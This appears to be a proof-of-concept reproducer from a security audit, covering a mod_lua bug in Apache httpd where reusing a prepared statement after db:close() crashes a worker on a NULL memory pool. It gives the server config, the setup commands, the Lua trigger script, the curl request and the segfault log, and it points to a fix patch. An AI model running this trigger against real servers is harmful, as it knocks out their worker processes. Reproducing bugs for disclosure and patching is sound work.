# PoC 091 — Prepared Query Uses Closed Pool

`lua_db_prepared_query()` calls `apr_pcalloc(st->db->pool, ...)` before
checking liveness, so a Lua script that reuses a prepared statement after
`db:close()` triggers a NULL-pool allocation. Same shape as 090, different
code path (`statement:query` instead of `statement:select`).

## Setup

Build httpd with `mod_lua` and an APR DBD driver. SQLite works fine.

`conf/httpd.conf`:

```
LoadModule lua_module modules/mod_lua.so
LoadModule dbd_module modules/mod_dbd.so

DBDriver sqlite3
DBDParams "/tmp/091.sqlite"

Listen 8091
ServerName 127.0.0.1
DocumentRoot "/tmp/091-doc"

<Location /poc>
    SetHandler lua-script
    LuaMapHandler /poc /tmp/091-doc/poc.lua handle
</Location>
```

Provision the database and Lua handler:

```
mkdir -p /tmp/091-doc
sqlite3 /tmp/091.sqlite 'CREATE TABLE t(v TEXT);'
cat > /tmp/091-doc/poc.lua <<'LUA'
function handle(r)
    local db = r:dbacquire("mod_dbd")
    local st, err = db:prepare(r, "INSERT INTO t(v) VALUES (%s)")
    db:close()
    -- Prepared statement userdata still reachable: reuse triggers the bug
    st:query(r, "x")
    r:puts("unreachable\n")
    return apache2.OK
end
LUA
```

## Trigger

```
httpd -X -f /path/to/conf/httpd.conf &
curl -sS http://127.0.0.1:8091/poc
```

## Observed effect

Worker SIGSEGV inside `apr_pcalloc()` because `st->db->pool == NULL`.
`error_log`:

```
[core:notice] AH00052: child pid NNNN exit signal Segmentation fault (11)
```

The intended Lua-level error string

```
Database connection seems to be closed, please reacquire it.
```

is not produced; the crash precedes it.

## Notes

- A debug APR build (`--enable-pool-debug`) often turns this into a clean
  abort with an `apr_pool_check_integrity` message, which is more useful in a
  reproducer environment.
- Apply the patch from finding 091 to confirm the closed-connection error is
  returned cleanly with the same Lua snippet.
